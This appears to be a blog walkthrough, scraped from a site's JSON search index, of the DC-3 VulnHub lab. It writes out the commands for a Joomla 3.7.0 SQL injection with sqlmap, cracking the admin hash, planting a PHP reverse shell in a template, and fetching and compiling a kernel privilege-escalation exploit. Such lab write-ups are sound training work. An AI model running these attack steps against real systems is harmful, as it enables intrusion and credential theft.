https://www.five86.com/dc-3.html ","date":"02-07-2023","objectID":"/dc-3/:1:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Obtaining DC-3‚Äôs IP \u0026 Set Vars Depending on your lab environment, the way DC-3 is assigned an IP address will vary. In my current layout, I have DC-3 being hosted, through virtualbox, on a host-only adapter. This host-only network has a virtualbox DHCP server running at 192.168.56.100 and this assigns DC-3 it‚Äôs IP address: 192.168.56.113. Running sudo netdiscover -i vboxnet0 -r 192.168.56.0/24 provides me the following result. -i vboxnet0 ‚Äì\u003e is the host-only interface, created by virtualbox, in which DC-3 exists. I then follow up by assigning a few variables and echoing them back to review for syntax errors. netdiscover followed by var assignment \u0026 echo ","date":"02-07-2023","objectID":"/dc-3/:2:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration With DC-3‚Äôs IP found and a few environmental variables set, let‚Äôs move onto scanning with nmap. ","date":"02-07-2023","objectID":"/dc-3/:3:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Scanning with nmap Let‚Äôs see what ports and services may be running on the target(DC-3). nmap $IP -T4 -p- -sC -sV --open $IP ‚Äì\u003e is the previously exported IP address of DC-3. -T4 ‚Äì\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap‚Äôs Timing Templates webpage. -p- ‚Äì\u003e tells nmap to scan ALL 65,535 TCP ports. -sC ‚Äì\u003e specifies nmap to run default scripts. -A includes this. -sV ‚Äì\u003e enables version detection. -A includes this. --open ‚Äì\u003e only shows ports that are ‚Äúopen‚Äù. Safe against a purposely vulnerable box. Using -A works too. It includes the two specified options above, plus traceroute. trimmed up nmap results Looks like a Joomla CMS provided by an apache server hosted on Ubuntu. Let‚Äôs make some notes and move onto manual inspection. ","date":"02-07-2023","objectID":"/dc-3/:3:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Notes \u0026 Try-List Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v x.x??? Try List ‚Äì\u003e Manual Inspection(view source, robots.txt, etc) ‚Äì\u003e fuzz directories/files ‚Äì\u003e joomscan ‚Äì\u003e Manual Inspection : Fuzzing Files : Fuzzing Dirs : joomscan results : ","date":"02-07-2023","objectID":"/dc-3/:3:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Manual Inspection Browsing to 192.168.56.113 provides us the Joomla home page. QUICK TRY LIST: Default creds? ‚Äì\u003e Failed admin:admin Username/Email Enum possible? ‚Äì\u003e Failed. Same responses Robots.txt doesn‚Äôt exist. View Page Source ‚Äì\u003e Nothing worth noting joomla home page Nothing obvious with the manual inspection, so let‚Äôs move onto fuzzing directories and files‚Ä¶ ","date":"02-07-2023","objectID":"/dc-3/:3:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Files Let‚Äôs see if the Joomla CMS has any files that are hidden or forgotten‚Ä¶ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c ‚Äì\u003e provides a color output for the webapp‚Äôs response column. -z file,/*wordlist* ‚Äì\u003e specifies payload type and points to file wordlist. --hc 403,404 ‚Äì\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile ‚Äì\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. wfuzz - files Let‚Äôs manually visit each recorded response, in our browser, to see what each presents! index.php - that‚Äôs the home page‚Ä¶ LICENSE.txt - nothing worth notating configuration.php - located in the root directory.. this provides Joomla needed parameters to properly run. db locations, settings, etc BUT we can‚Äôt access it. Not helpful for now but maybe we enum once we get access‚Ä¶ README.txt - provides a Joomla version of 3.7.0 - add that to our notes! htaccess.txt - file that specifies access control settings Well, we were able to enumerate Joomla‚Äôs versioning. 3.7.0! Time to enumerate the directories. ","date":"02-07-2023","objectID":"/dc-3/:3:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Fuzzing Directories Just like before but with the $URLdir variable and directories.txt wordlist. We‚Äôll also add the option --hh 31, as this will filter out some responses that have no value to us(blank pages,forbidden,etc). wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 --hh 31 $URLdir wfuzz - directories Again, just as before. Let‚Äôs visit the response‚Ä¶/administrator/ Looks like an admin login page but with no usernames, attempting to login would be a waste. ","date":"02-07-2023","objectID":"/dc-3/:3:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Try List ‚Äì\u003e joomscan Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : ","date":"02-07-2023","objectID":"/dc-3/:3:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Enum/Vuln scan with joomscan joomscan, an OWASP project, is aimed at automating vulnerability detection of Joomla CMS deployments. Please see OWASP‚Äôs joomscan github for more information. It‚Äôs very simple to run, but let‚Äôs go ahead and export an environment variable called URLjoomscan.(It‚Äôs good practice, that‚Äôs why!) export URLjoomscan=\"http://192.168.56.113/\" Now let‚Äôs run joomscan joomscan -u $URLjoomscan We get a version confirmation of 3.7.0. It also shows there‚Äôs no Joomla core vulnerability but this isn‚Äôt true. The next section will show otherwise. Confirming a tool‚Äôs findings is an important step, as you‚Äôll sometimes run into false results! Joomla 3.7.0 and admin login page - confirmed ","date":"02-07-2023","objectID":"/dc-3/:3:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Researching Exploits We‚Äôre not at a dead-end but since we have a confirmed version of Joomla 3.7.0, let‚Äôs go ahead and search exploit-db.com database which is searchable locally using searchsploit. searchsploit (AKA local repo of exploit-db.com) isn‚Äôt the only option and shouldn‚Äôt be. I don‚Äôt document it on these posts, but I do spend time on google researching exploits. Searchsploit isn‚Äôt the end all of finding an exploit. There‚Äôs many hidden gems out there! See my resources pages for more exploit resources! ","date":"02-07-2023","objectID":"/dc-3/:4:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit joomla 3.7 searchsploit joomla 3.7 results in the following(see pic) searchsploit 3.7 results There‚Äôs two helpful options we can use to interact with the searchsploit results: -m aka --mirror - this copies an exploit to the current working directory. -x aka --examine - this displays the exploit contents in the terminal. I‚Äôll be using the -m option to copy the file to the current working directory. Since there‚Äôs two exploits I‚Äôm interested in, I‚Äôll copy each. searchsploit -m php/remote/44227.php \u0026\u0026 searchsploit -m php/webapps/42033.txt After looking at both exploits, the 44227.php file concatenates the joomla database tables for usernames, emails, dbusers, dbnames, dbversion while the 42033.txt file just shows a few SQLi examples. One example is through sqlmap! I want to get more experience using sqlmap, so this will be the path I take. The vulnerability, in Joomla, looks to relate to the com_fields component being accessible by the public but is also used for internal administrative use. We‚Äôll be abusing this‚Ä¶ You can test for SQL injection by simply running the following in your browser http://*DC-3-IP*/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=%27 If you get this response, then it‚Äôs vulnerable to SQLi (SQL Injection)! Confirming SQLi for Joomla 3.7.0 ","date":"02-07-2023","objectID":"/dc-3/:4:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Again, I‚Äôll be using sqlmap to dump data from the Joomla SQL DB but feel free to approach this how you‚Äôd like! That‚Äôs part of the fun! ","date":"02-07-2023","objectID":"/dc-3/:5:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Running sqlmap against Joomla DB File 42033.txt gives us this example to run, so let‚Äôs try it out. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] You‚Äôll want to replace ‚Äúlocalhost‚Äù with DC-3‚Äôs IP address. -u ‚Äì\u003e specifies the URL in which we‚Äôre attacking. We need to include the entire syntax of the com_fields address as it‚Äôs the exploit we‚Äôre abusing. --risk=3 ‚Äì\u003e basically runs most(loudest) tests. We‚Äôre not being stealthy, so it‚Äôs OK. --level=5 ‚Äì\u003e provides us a higher level of verbose --dbs ‚Äì\u003e Enumerates DBMS databases --p list[fullordering] ‚Äì\u003e the output format Just hit enter to run defaults if you‚Äôre asked any questions during runtime. MySQL - databases mysql confirmed MySQL version \u003e=5.1. Add this to the notes! This results in a list of the databases in the MySQL server. Let‚Äôs now specify the database we want to enumerate using the options and value -D joomladb and list out its tables. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] Remove --dbs and add -D joomladb - this specifies the ‚Äújoomladb‚Äù database we want to query aka ‚ÄúUSE DATABASE joomla;‚Äù Add --tables ‚Äì\u003e this basically runs ‚ÄúSHOW tables;‚Äù MySQL - joomladb tables It‚Äôs a longer list, but we‚Äôre seeing a #__users table. Let‚Äôs go ahead and --dump it‚Äôs data. sqlmap -u \"http://localhost/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T \"#__users\" --dump -p list[fullordering] Replace --tables with -T \"#__users\" ‚Äì\u003e this specifies the table Add option --dump ‚Äì\u003e this will dump all the data in the #__users table. It might ask ‚Äúdo you want to use common column existence check‚Äù.. answer y When asked about which dictionary to use, default #1 is fine. 1 thread is fine. Press enter to run the default speed. MySQL Table Dump! Nice! We end up with a dump showing the details of the username admin, including the password hash! ","date":"02-07-2023","objectID":"/dc-3/:5:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat Before we can crack the hash, we need to do two things. Move the hash into a file for hashcat. Figure out what hash algorithm was used. Let‚Äôs place $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu into a file, so we can feed it to hashcat echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u003e dc-3-mysql-hash-dump.txt After researching the hash on google, I found that hashes starting with $2y$ are bcrypt. We tell hashcat it‚Äôs bcrypt with option -m 3200 Now that we know the hashing algorithm and the hash is inside a file, let‚Äôs run hashcat! hashcat -m 3200 -a 0 dc-3-mysql-hash-dump.txt /usr/share/wordlists/rockyou.txt -m 3200 ‚Äì\u003e specifies bcrypt hash algorithm -a 0 ‚Äì\u003e tells hashcat to run a straight attack, it runs against each word in the dictionary without character alteration *.txt ‚Äì\u003e is the files containing the hashes /*/wordlist.txt ‚Äì\u003e specifies the location of the wordlist Username admin hash cracked!! We now have an email, username, and password! Let‚Äôs update our notes! Plus MySQL versioning and potential username:freddy. ","date":"02-07-2023","objectID":"/dc-3/:5:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating our notes again Box Name : DC-3 (DC Series) OS : Ubuntu (Linux) IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL - \u003e= 5.1 EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy ","date":"02-07-2023","objectID":"/dc-3/:5:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Logging into Joomla as admin Head to /administrator/ login form and use our newly cracked password ‚Äì\u003e admin:snoopy. Logged in as admin - Joomla We‚Äôre now logged into Joomla as admin! At this point, it‚Äôs good to look around the admin panel to see what there is to notate. Versions? Other users? Anything! A good place to start, with Joomla, is in the System \u003e System Information panel Joomla‚Äôs configuration panel Although a back burner item, notating the kernel version is important as it may be the last easy way to gaining privesc. I found the following information and added them to the notes. Kernel ‚Äì\u003e Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 Ubuntu ‚Äì\u003e 5.7.25-0ubuntu0.16.04.2 PHP Version ‚Äì\u003e 7.0.33-0ubuntu0.16.04.2 Apache ‚Äì\u003e Apache/2.4.18 (Ubuntu) Server API‚Äì\u003e Apache2Handler 20120211 Zend Engine ‚Äì\u003e v3.0.0 MySQL ‚Äì\u003e 5.0.12-dev OpenSSL ‚Äì\u003e 1.0.2g Box Name : DC-3 (DC Series) Kernel/OS : Ubuntu (Linux) Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 ‚Äì 5.7.25-0ubuntu0.16.04.2 IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 ADDITIONAL SERVICES MySQL ‚Äì\u003e 5.0.12-dev PHP ‚Äì\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler ‚Äì\u003e 20120211 Zend Engine ‚Äì\u003e 3.0.0 OpenSSL ‚Äì\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla POTENTIAL USERNAMES freddy Now that we have admin access, will it allow us to inject malicious php code into the php forms? ","date":"02-07-2023","objectID":"/dc-3/:5:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"reverse-shell against a template I quickly found two possible ways to gain reverse shells through PHP. Upload option located at Content \u003e Media (there may be upload restrictions you have to get around. See Content \u003e Media \u003e Options) php templates in Extension \u003e Templates \u003e Templates With the Content \u003e Media option, you‚Äôd want to upload the reverse shell(revshell) then somehow execute it.. This can be done by visiting the file by simply accessing it e.g. http://192.168.56.113/images/malicious-file.extension Option two is done by simply pasting pentestmonkey‚Äôs php-revshell code into a template and previewing it. aka the contents of the .php file you‚Äôd use for option #1 is executed when Joomla previews(executes) the code. I‚Äôll go the template route. Navigate to the Beez3 template by Extensions \u003e Templates \u003e Templates \u003e Beez3 Details and Files index.php then paste revshell over the existing data. Edit the $ip and $port variables to match your attack system‚Äôs IP and the port you‚Äôd like to use. e.g. 1234. ‚ö†Ô∏è DO NOT SAVE \u0026 PREVIEW the template yet! Netcat needs configured PHP revshell configured and ready! Now it‚Äôs time to setup netcat, so it‚Äôs listening on the port you previously specified in the php template. Open another terminal tab and run: nc -nvlp 1234 n ‚Äì\u003e uses IP addressing and not DNS v ‚Äì\u003e verbose mode l ‚Äì\u003e tells nc to listen p ‚Äì\u003e specifies the port e.g. 1234 Now that we have nc listening, it‚Äôs time to get a revshell! Jump back to Joomla and click ‚ÄúSave \u0026 Close‚Äù followed by clicking ‚ÄúTemplate Preview‚Äù. We have remote shell! Successful revshell ","date":"02-07-2023","objectID":"/dc-3/:5:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Post-Exploitation Now that we have a revshell, we‚Äôll want to establish a stable shell that has tty and continue enumeration, search for privesc exploits/abuses, and finally gain root. ","date":"02-07-2023","objectID":"/dc-3/:6:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Upgrading shell incl. tty Let‚Äôs check for tty. Nope. Let‚Äôs check for restricted shell by running a few commands‚Ä¶ ls cd / echo. No rbash! So let‚Äôs get us a stable shell with tty. Thanks to S1ren‚Äôs blog! Let‚Äôs check for python‚Ä¶ with which python. Sweet. Let‚Äôs spawn a python shell! python -c 'import pty; pty.spawn(\"/bin/bash\")' - this spawns a bash shell, with tty, through python Now let‚Äôs set PATH variables, output color, and an alias. export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp ‚Äì\u003e export variables export TERM=xterm-256color ‚Äì\u003e color in terminal alias ll='ls -lsaht --color=auto' ‚Äì\u003e ll runs ls -lsaht Press Ctrl + Z to make our zhs shell a background process through netcat(nc) stty raw -echo;fg;reset then enter twice ‚Äì\u003e input and output is not processed, e.g. can‚Äôt cancel shell by CTRL+C, then opens background shell with reset stty columns 200 rows 200 ‚Äì\u003e this sets columns and rows to max on terminal output Now CTRL+C won‚Äôt disconnect us and we have nice terminal output. üòÉ A stable python spawned bash shell with tty ","date":"02-07-2023","objectID":"/dc-3/:6:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Checking for sudo privs Let‚Äôs see if we have sudo privs by running sudo -l.. well it‚Äôs asking for a password and snoopy does not work. So, we‚Äôll either need to find user www-data‚Äôs password or find another privesc path. ","date":"02-07-2023","objectID":"/dc-3/:6:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"enum /etc/shadow \u0026 /etc/passwd Let‚Äôs see if we have access to cat /etc/shadow or cat /etc/passwd. Denied access to shadow but we have access to passwd. user dc3 found In linux, user created users start with an ID of 1000. e.g. 1000 and 1001 would indicate two users NOT including root. Root is always ID 0. Looks like we have a user to add to our notes: dc3 ","date":"02-07-2023","objectID":"/dc-3/:6:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searching binaries w/ SUID bit set The SUID, Set User ID, is a feature that allows a binary to run under the permissions of another user. The abuse comes from administrators setting the SUID bit on binaries that are abusable and share root permissions. After we find the SUID binaries, we check them for abuse through an online reference like GTFOBins. To search the target for binaries which have the SUID bit set, we‚Äôll run the following command: find / -perm -u=s -type f 2\u003e/dev/null find / ‚Äì\u003e searches the root directory where the‚Ä¶ -perm -u=s ‚Äì\u003e permission, for the current user, is set to s ‚Äústicky bit‚Äù -type f ‚Äì\u003e to only list files 2\u003e/dev/null ‚Äì\u003e redirects any errors to a black hole in space üòÅ SUID set binaries The at binary is abusable for privesc BUT it requires the user to have SUDO privs to the file and not SUID, so this is a dead end since we lack SUDO privs. ","date":"02-07-2023","objectID":"/dc-3/:6:4","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Looking for abusable cron jobs Let‚Äôs see what processes are running as ‚Äòroot‚Äô by executing the following: ps -U root -u root u this shows every process running as root in user format. Pulled from ps man page. cron running as root I looked for anything abusable running under a cronjob but there was nothing. ","date":"02-07-2023","objectID":"/dc-3/:6:5","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Digging into /html root Let‚Äôs see if Joomla‚Äôs configuration file holds anything special‚Ä¶ cat /var/www/html/configuration.php Looks like we found the root MySQL database password! root:squires MySQL creds found ","date":"02-07-2023","objectID":"/dc-3/:6:6","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Accessing MySQL db mysql -uroot -psquires We end up having root access to the MySQL database but nothing of value was found. ","date":"02-07-2023","objectID":"/dc-3/:6:7","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating \u0026 Reviewing Notes I tried using all combinations of username/passwords for su and got nowhere. The only other thing to check is the kernel. It may be exploitable. At this point, let‚Äôs gather all the kernel/OS info and add it to our notes, or confirm what we already have, so we can find the best possible exploit. file /bin/bash cat /etc/*-release uname -a This results in the following: Kernel \u0026 OS Info Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0 Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 exfil of admin credentials via SQL injection command execution through php to gain remote shell ADDITIONAL SERVICES MySQL ‚Äì\u003e 5.0.12-dev PHP ‚Äì\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler ‚Äì\u003e 20120211 Zend Engine ‚Äì\u003e 3.0.0 OpenSSL ‚Äì\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL POTENTIAL USERNAMES freddy , dc3 ","date":"02-07-2023","objectID":"/dc-3/:6:8","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Gaining root! The plan: We‚Äôre going to searchsploit, look for an exploit, figure out how to execute the exploit, execute the exploit, and hopefully gain root! ","date":"02-07-2023","objectID":"/dc-3/:7:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Searchsploit per OS/Kernel We‚Äôre going searchsploit the OS and kernel versions for any exploit that may give us privilege escalation, making sure it‚Äôs not a 64-bit exploit. searchsploit is picky with syntax. If you include too much in your search query, you might miss out on a result. e.g. searchsploit 4.4.0 may miss out on the result of 4.4.x since 0 was specified. Let‚Äôs run searchsploit ubuntu 16.04 4.4 priv esc This will look for any exploits that include ubuntu + 16.04 + 4.4 + priv + esc and we get the following results! searchsploit kernel exploit results I‚Äôm going to choose the linux/local/39772.txt and the chances of it working increase when seeing a ‚Äúx‚Äù in the kernel results 4.4.*x*. Let‚Äôs copy the text file over to our current working directory. Since searchsploit copies files to the current working directory, please cd into desired directory before running: searchsploit -m linux/local/39772.txt. Now let‚Äôs nano 39772.txt to see the details of the exploit like what needs configured(if needed), how to execute, etc It looks like we need access to the following binaries, on the target machine, in order to execute the exploit. which wget ‚Äì\u003e Found it! To transfer the exploit from attackbox to the target. which unzip ‚Äì\u003e Found it! To unzip the 39772.zip file. which tar ‚Äì\u003e Found it! To untar the exploit.tar file. which cc ‚Äì\u003e Found it! To compile the *.c files. Sweet! We‚Äôre good to transfer, compile, and run the exploit. Let‚Äôs download the exploit to our attackbox. üòÅ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip I use vim to look inside the zip file and it holds the *.tar file needed to exploit the target: exploit.tar. The crasher.tar is the PoC, and is NOT needed. Good to know as we‚Äôll need to unzip this archive, once on the target, and compile the exploit to run. Contents of 39772.zip Let‚Äôs now move onto transferring the exploit and executing it! ","date":"02-07-2023","objectID":"/dc-3/:7:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Transferring the exploit On the attackbox‚Äôs terminal, you‚Äôll want to start up a http server, or any other quick file host app, to host the exploit, so the target can download it. I do this with python. python -m http.server ‚Äì\u003e this will run a http server within the current working directory which is where I downloaded the 39772.zip file. Let‚Äôs hop back onto the target‚Äôs terminal and cd /var/tmp. I choose /var/tmp as it‚Äôll preserve our exploit through reboots. I‚Äôm doing this in case the system crashes and its needed for a second run. Normally, we place exploits in /tmp since it‚Äôs cleared at reboot. When it comes to pentests, it‚Äôs important to clean up after yourself and revert any settings/changes that were made. Unless specified, you never want to leave changes in place as it might alter the operations of the business. Once in /var/tmp, we run the following to download the exploit from the attackbox. wget http://192.168.56.1:8000/39772.zip wget ‚Äì\u003e is a simple network downloader that exists on most standard linux distros. http://192.168.56.1:8000/ ‚Äì\u003e is my attackbox‚Äôs IP, along with the default port http.server uses 39772.zip ‚Äì\u003e is the exploit we downloaded earlier. Here‚Äôs a successful transfer, of 39772.zip, from the attackbox to the target. Attackbox - file transfer successful 200 Targetbox - file transfer successful We can now ll, on the target‚Äôs terminal, and see that we have the file in the current working directory. ","date":"02-07-2023","objectID":"/dc-3/:7:2","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Exploiting Kernel 4.4.0-21-generic! Now that we have the kernel exploit on the target machine, we‚Äôre set to extract, compile, and execute. unzip 39772.zip ‚Äì\u003e unzip folder‚Äôs contents into a folder with the same name ‚Äú39772‚Äù cd 39772 ‚Äì\u003e will change working directory into the ‚Äú39722‚Äù folder, which contains the tar files ll ‚Äì\u003e will show the two files, but we‚Äôll only need to untar the exploit.tar file. tar -xvf exploit.tar ‚Äì\u003e this untars the exploit.tar file. ll again ‚Äì\u003e you‚Äôll see a folder called ‚Äúebpf_mapfd_doubleput_exploit‚Äù cd ebpf_mapfd_doubleput_exploit ‚Äì\u003e change directory into ebpf_mapfd_doubleput_exploit folder ll again ‚Äì\u003e you‚Äôll see a compile.sh file. This is the file that‚Äôll compile, using cc, the exploit that we‚Äôll execute. ./compile.sh ‚Äì\u003e You may see some errors, and since they‚Äôre non critical we‚Äôll ignore them. ll again ‚Äì\u003e you should see a few new files. suidhelper, doubleput, and hello. exploit ready for execution! Now we have an exploit, called doubleput, that‚Äôs ready to be executed!! Let‚Äôs get to it already! ./doubleput ‚Äì\u003e executes the exploit‚Ä¶. and‚Ä¶ ","date":"02-07-2023","objectID":"/dc-3/:7:3","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"ROOTED!! ROOT GAINED!!! ","date":"02-07-2023","objectID":"/dc-3/:8:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Updating notes incl. attack process! Box Name : DC-3 (DC Series) OS/Bit/Kernel : Ubuntu (Linux) 16.04, 32-bit LSB, 4.4.0-21-generic kernel Priviledge Escalation gained by exploiting vulnerability in Linux Kernel 4.4.0-21-generic. Exploit used = Linux Kernel 4.4.x (Ubuntu 16.04) - ‚Äòdouble-fdput()‚Äô bpf(BPF_PROG_LOAD) Privilege Escalation IP : 192.168.56.113 Ports / Services 80 : Apache httpd 2.4.18 80 : Joomla v3.7.0 Manual Inspection : Nothing worthy Fuzzing Files : README.txt provides versioning 3.7.0(Info Disclosure) Fuzzing Dirs : /administrator/ provides admin login form joomscan : confirmed versioning 3.7.0 Exfil of Joomla‚Äôs admin hashed credential, through a SQL injection vulnerability in Joomla‚Äôs Core (Exploit used = Joomla! 3.7.0 - ‚Äòcom_fields‚Äô SQL Injection), granted admin access to Joomla‚Äôs admin panel which allowed for remote code execution resulting in a reverse shell to DC-3. This php revshell RCE was accomplished through Joomla‚Äôs php templates. Once the reverse shell was established, we gained full access to the MySQL database after finding clear text root MySQL credentials within Joomla‚Äôs configuration file. To gain root privileges, we exploited DC-3‚Äôs vulnererable linux kernel by the above listed exploit, ‚Äòdouble-fdput()‚Äô ADDITIONAL SERVICES MySQL ‚Äì\u003e 5.0.12-dev PHP ‚Äì\u003e 7.0.33-0ubuntu0.16.04.2 Apache2Handler ‚Äì\u003e 20120211 Zend Engine ‚Äì\u003e 3.0.0 OpenSSL ‚Äì\u003e 1.0.2g EMAILS freddy@norealaddress[.]net CREDENTIALS admin:snoopy - Joomla root:squires - MySQL USERNAMES dc3 - DC-3 ID=1000 POTENTIAL USERNAMES freddy ","date":"02-07-2023","objectID":"/dc-3/:8:1","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"Thanks for visiting! I hope you enjoyed DC-3. Next, DC-4! ","date":"02-07-2023","objectID":"/dc-3/:9:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-2 from the DC-Series(VulnHub).","date":"01-31-2023","objectID":"/dc-2/","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"With DC-1 out of the way, let‚Äôs move onto DC-2 of the DC Series! ","date":"01-31-2023","objectID":"/dc-2/:0:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-2 Details Click here to see DC-2's quick overview. Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. As with the original DC-1, it‚Äôs designed with beginners in mind. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. Just like with DC-1, there are five flags including the final flag. And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience. In short, the only flag that really counts, is the final flag. For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc. I haven‚Äôt explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install. Further details can be found at https://www.five86.com/dc-2.html. 